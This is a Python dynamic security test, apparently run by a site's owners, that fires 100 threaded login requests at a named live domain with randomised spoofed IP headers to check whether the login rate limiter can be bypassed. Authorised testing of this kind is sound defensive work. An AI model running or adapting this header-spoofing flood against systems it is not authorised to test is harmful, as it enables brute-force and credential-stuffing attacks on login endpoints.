#!/usr/bin/env python3
"""
DAST Script 1: Cloudflare IP Spoofing & Rate Limit Cannon
═══════════════════════════════════════════════════════════
Target : POST /api/auth/login (authRateLimit: 20 req/min/IP)
Attack : 100 requests in ~5 seconds with spoofed IP headers
Goal   : Verify trust proxy config correctly identifies real IP
         and ignores spoofed X-Forwarded-For / CF-Connecting-IP

Expected result if SECURE:
  - Requests 1-20: 200 or 401 (auth failure)
  - Requests 21+:  429 (Too Many Requests)

Expected result if VULNERABLE:
  - All 100 requests return 200/401 (rate limit never triggers
    because each spoofed IP gets its own bucket)
"""

import requests
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Configuration ──────────────────────────────────────────────────────────
TARGET = "https://livelinepcbn.com"
ENDPOINT = f"{TARGET}/api/auth/login"
TOTAL_REQUESTS = 100
THREADS = 10

# Deliberately wrong credentials — we're testing rate limiting, not auth
PAYLOAD = {"email": "ratelimit-test@fake.com", "password": "wrong_password_123"}

# ─── Attack ─────────────────────────────────────────────────────────────────
results = {"blocked": 0, "passed": 0, "errors": 0}
status_counts = {}


def gen_random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def fire_request(i):
    """Send one login request with aggressively spoofed IP headers."""
    fake_ip = gen_random_ip()
    headers = {
        "Content-Type": "application/json",
        # All known IP-forwarding headers an attacker would try to spoof
        "X-Forwarded-For": fake_ip,
        "CF-Connecting-IP": fake_ip,
        "True-Client-IP": fake_ip,
        "X-Real-IP": fake_ip,
        "X-Client-IP": fake_ip,
        "Forwarded": f"for={fake_ip}",
    }
    try:
        r = requests.post(ENDPOINT, json=PAYLOAD, headers=headers, timeout=10)
        return i, r.status_code, r.text[:120]
    except Exception as e:
        return i, 0, str(e)[:120]


print(f"""
╔══════════════════════════════════════════════════════════╗
║  DAST #1 — Rate Limit Cannon + IP Spoofing              ║
║  Target : {ENDPOINT:<46} ║
║  Volume : {TOTAL_REQUESTS} requests across {THREADS} threads{' '*20}║
╚══════════════════════════════════════════════════════════╝
""")

start = time.time()

with ThreadPoolExecutor(max_workers=THREADS) as pool:
    futures = [pool.submit(fire_request, i) for i in range(TOTAL_REQUESTS)]
    for future in as_completed(futures):
        i, code, body = future.result()
        status_counts[code] = status_counts.get(code, 0) + 1

        if code == 429:
            results["blocked"] += 1
        elif code == 0:
            results["errors"] += 1
        else:
            results["passed"] += 1

        # Print progress every 10 requests
        if (i + 1) % 10 == 0 or code == 429:
            elapsed = time.time() - start
            print(f"  [{i+1:3d}/{TOTAL_REQUESTS}] {elapsed:5.1f}s  HTTP {code}  {'🛑 BLOCKED' if code == 429 else '✅ PASSED'}")

elapsed = time.time() - start

print(f"""
════════════════════════ RESULTS ════════════════════════
  Total requests : {TOTAL_REQUESTS}
  Elapsed time   : {elapsed:.1f}s
  Passed (2xx/4xx): {results['passed']}
  Blocked (429)    : {results['blocked']}
  Errors           : {results['errors']}

  Status breakdown : {dict(sorted(status_counts.items()))}
""")

if results["blocked"] > 0:
    print("  ✅ VERDICT: SECURE — Rate limiter is working.")
    print(f"     Server blocked {results['blocked']}/{TOTAL_REQUESTS} requests despite IP spoofing.")
    print("     Spoofed X-Forwarded-For headers were correctly IGNORED.")
else:
    print("  🔴 VERDICT: VULNERABLE — Rate limiter did NOT trigger!")
    print("     All 100 requests went through. Possible causes:")
    print("     1. 'trust proxy' is trusting attacker-supplied X-Forwarded-For")
    print("     2. Rate limiter is misconfigured or disabled")
    print("     3. Rate limit window is too large")
